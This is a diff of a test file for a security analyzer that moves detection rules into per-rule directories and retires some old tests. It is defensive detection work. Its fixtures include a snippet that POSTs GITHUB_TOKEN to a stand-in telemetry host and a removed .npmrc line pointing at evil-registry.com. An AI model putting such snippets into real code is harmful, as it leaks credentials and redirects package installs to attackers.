@@ -18,7 +18,13 @@ import "../src/rules/implementations/a6-unicode-homoglyph/index.js";
 import "../src/rules/implementations/a7-zero-width-injection/index.js";
 import "../src/rules/implementations/a9-encoded-instructions/index.js";
 import "../src/rules/implementations/d3-typosquatting/index.js";
-import "../src/rules/implementations/f1-lethal-trifecta.js";
+// f1-lethal-trifecta.ts deleted in Phase 1 Chunk 1.25 (wave-3); F1/F7/F2/F3/F6
+// each moved to own v2 directories.
+import "../src/rules/implementations/f1-lethal-trifecta/index.js";
+import "../src/rules/implementations/f2-high-risk-capability-profile/index.js";
+import "../src/rules/implementations/f3-data-flow-risk-source-sink/index.js";
+import "../src/rules/implementations/f6-circular-data-loop/index.js";
+import "../src/rules/implementations/f7-multi-step-exfiltration-chain/index.js";
 import "../src/rules/implementations/g4-context-saturation.js";
 // tainted-execution-detector.ts deleted in Phase 1 Chunk 1.16.
 import "../src/rules/implementations/c4-sql-injection/index.js";
@@ -39,7 +45,12 @@ import "../src/rules/implementations/q4-ide-mcp-config-injection/index.js";
 import "../src/rules/implementations/l9-ci-secret-exfiltration/index.js";
 import "../src/rules/implementations/k2-audit-trail-destruction/index.js";
 import "../src/rules/implementations/g7-dns-exfiltration-channel/index.js";
-import "../src/rules/implementations/supply-chain-detector.js";
+// supply-chain-detector.ts deleted in Phase 1 Chunk 1.11 — its four rules
+// (L5, L12, L14 stub, K10) each moved to their own directory.
+import "../src/rules/implementations/l5-manifest-confusion/index.js";
+import "../src/rules/implementations/l12-build-artifact-tampering/index.js";
+import "../src/rules/implementations/l14-hidden-entry-point-mismatch/index.js";
+import "../src/rules/implementations/k10-package-registry-substitution/index.js";
 // code-security-deep-detector.ts removed in Phase 1 Chunk 1.18 — its four
 // rules (C2, C5, C10, C14) each moved to their own directory.
 import "../src/rules/implementations/c2-path-traversal/index.js";
@@ -48,13 +59,17 @@ import "../src/rules/implementations/c10-prototype-pollution/index.js";
 import "../src/rules/implementations/c14-jwt-algorithm-confusion/index.js";
 import "../src/rules/implementations/ai-manipulation-detector.js";
 import "../src/rules/implementations/infrastructure-detector.js";
-import "../src/rules/implementations/advanced-supply-chain-detector.js";
-// Phase 1 Chunk 1.9 migrated L1/L2/L6/L13 out of advanced-supply-chain-detector
-// into per-rule directories.
+// advanced-supply-chain-detector.ts deleted in Phase 1 Chunks 1.9 + 1.10 —
+// L1/L2/L6/L13 (chunk 1.9) and L7/K3/K5/K8 (chunk 1.10) each moved to their
+// own directory.
 import "../src/rules/implementations/l1-github-actions-tag-poisoning/index.js";
 import "../src/rules/implementations/l2-malicious-build-plugin/index.js";
 import "../src/rules/implementations/l6-config-symlink-attack/index.js";
 import "../src/rules/implementations/l13-build-credential-file-theft/index.js";
+import "../src/rules/implementations/l7-transitive-mcp-delegation/index.js";
+import "../src/rules/implementations/k3-audit-log-tampering/index.js";
+import "../src/rules/implementations/k5-auto-approve-bypass/index.js";
+import "../src/rules/implementations/k8-cross-boundary-credential-sharing/index.js";
 import "../src/rules/implementations/protocol-ai-runtime-detector.js";
 import "../src/rules/implementations/data-privacy-cross-ecosystem-detector.js";
 
@@ -260,32 +275,10 @@ describe("Detector 4: Additional Coverage", () => {
 
 // ─── Previously Untested Rules: Detector 5 extras ──────────────────────────
 
-describe("Detector 5: Additional Coverage", () => {
-  it("L12 — flags prepublishOnly modifying dist/", () => {
-    const findings = analyzeRule("L12", makeContext({
-      source_code: JSON.stringify({
-        scripts: {
-          build: "tsc",
-          prepublishOnly: "sed -i 's/foo/bar/' dist/index.js",
-        },
-      }),
-    }));
-    const l12 = findings.filter(f => f.rule_id === "L12");
-    expect(l12.length).toBeGreaterThan(0);
-  });
-
-  it("L12 — does NOT flag postbuild with minification", () => {
-    const findings = analyzeRule("L12", makeContext({
-      source_code: JSON.stringify({
-        scripts: {
-          postbuild: "terser dist/index.js -o dist/index.min.js",
-        },
-      }),
-    }));
-    const l12 = findings.filter(f => f.rule_id === "L12");
-    expect(l12.length).toBe(0);
-  });
-});
+// Detector 5 additional coverage — MIGRATED in Phase 1 Chunk 1.11 (wave-3).
+// L12 v2 (packages/analyzer/src/rules/implementations/l12-build-artifact-tampering/)
+// parses scripts as structured manifest data, not a JSON-stringified blob
+// in source_code. Comprehensive coverage in the per-rule test suite.
 
 // ─── Previously Untested Rules: Detector 6 extras ──────────────────────────
 
@@ -424,13 +417,11 @@ describe("Detector 9: Additional Coverage", () => {
     expect(findings.length).toBe(0);
   });
 
-  it("K8 — flags shared credential across services", () => {
-    const findings = analyzeRule("K8", makeContext({
-      source_code: `const shared_token = process.env.SHARED_API_KEY;\nforward_token(shared_token, upstream_server);`,
-    }));
-    expect(findings.length).toBeGreaterThan(0);
-    expect(findings[0].rule_id).toBe("K8");
-  });
+  // K8 — Cross-Boundary Credential Sharing migrated to v2 in Phase 1
+  // Chunk 1.10 (wave-3). The v2 rule requires structural credential-source
+  // classification + cross-boundary sink taint; bare `forward_token(...)`
+  // snippets lack source classification. Comprehensive coverage lives in
+  // packages/analyzer/src/rules/implementations/k8-cross-boundary-credential-sharing/__tests__/index.test.ts
 });
 
 // ─── Detector 10: Protocol & AI Runtime extras ─────────────────────────────
@@ -617,7 +608,10 @@ describe("Assertion Strength: Verify rule_id on all TPs", () => {
         source_code: `async function publish() {\n  const token = process.env.GITHUB_TOKEN;\n  await fetch("https://telemetry.example.invalid/report", { method: "POST", body: token });\n}\npublish();`,
       },
     },
-    { ruleId: "K10", context: { source_code: "registry=https://evil-registry.com/npm/" } },
+    // K10 migrated to v2 in Phase 1 Chunk 1.11 (wave-3); structural .npmrc
+    // parsing now lives in packages/analyzer/src/rules/implementations/
+    // k10-package-registry-substitution/__tests__/index.test.ts — a bare
+    // source_code line no longer satisfies the v2 input contract.
     { ruleId: "Q13", context: { source_code: '"command": "npx mcp-remote https://api.example.com/mcp"' } },
   ];
 
